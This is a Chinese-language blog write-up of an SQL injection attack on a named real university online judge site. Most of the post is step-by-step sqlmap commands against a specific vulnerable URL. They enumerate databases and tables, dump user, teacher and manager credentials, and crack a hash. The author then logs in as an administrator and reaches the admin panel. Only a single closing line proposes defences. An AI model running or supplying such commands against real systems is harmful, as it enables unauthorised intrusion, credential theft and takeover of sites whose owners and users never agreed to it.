用SQLMAP对 acm.cs.ecnu.edu.cn 进行扫描，发现存在注入点：http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片1.png)

对其进行注入并读取出网站的各个数据库名称：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片2.png)

得出网站由三个数据库组成：acm、eoj、information_schema

执行命令："./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D acm–tables"曝出acm数据库里所有的表名：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片3.png)

同理分别执行命令"./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2”
-D eoj –tables”和“./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D information_schema –tables"曝出eoj数据库和information_schema数据库的表名称：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片4.png) ![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片5.png)

继续深入挖掘数据库表的schema，尝试获取acm数据库里的各张表的schema，分别执行命令“./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D acm –T user --columns”(其中把-T 后的命令项分别改为其他的表名就可尝试获取对应表的Schema,获取到：

user表的schema：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片6.png)

user_group表的schema:

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片7.png)

user_group_name表的schema：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片8.png)

teacher表的schema:

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片9.png)

manage表的schema：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片10.png)

尝试获取一位用户的用户名和密码，尝试dump user表里的“id，name，password”，执行命令：“./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D acm –T user –C “id,name,password” –-start 1 –-stop 1 --dump”

成功获取到一位用户的账户名和密码：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片11.png)

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片12.png)

使用解密工具进行解密：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片13.png)

用该用户名和密码成功登陆上该用户账户：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片14.png)

可以查看该用户以往所有提交过的代码：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片15.png)

注：事实上虽然这一个账号是在user表里被获取出来的而不是从teacher表或manager表中获取出来的，但由于在dump的时候读取的是存在表中的第一个条目，因此这一账号很可能是网站建设初始阶段的管理员身份的账号，事实上这个账号确实不是普通的账号，是拥有极高权限的管理员账号，这一点在后面的dump manager表出来的数据可以印证这一点。

下面执行命令：“./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D acm –T teacher –C “name,password” --dump”

和 “./sqlmap.py -u “http://acm.cs.ecnu.edu.cn/bbsread.php?id=3635&set=2” -D acm –T manager –C “user,password,viewcode_priv”–dump”

分别获取teacher表和manager表中的用户名和密码等条目：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片16.png)

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片17.png)

正如之前所提到的，用户”lcftc”在manager中存在，且拥有查阅他人代码的权限。

简单尝试了几个后台的登录域名，猜中域名“http://acm.cs.ecnu.edu.cn/manage/managelogin.php” 为平台的后台登录界面：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片18.png)

利用先前获取的lcftc用户的密码进行登录，成功进入后台管理界面：

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片19.png)

![](/Users/fawks96/blog/themes/beantech/source/_posts/SQL Injection Attack Project/图片20.png)

至此，成功拥有了发布题目，修改任意题目内容，查看任何人的任何代码等最高管理权限

为漏洞的解决提出解决方案或防范方法：

过滤请求参数，使用参数化的SQL或直接使用存储过程进行数据查询存取等。
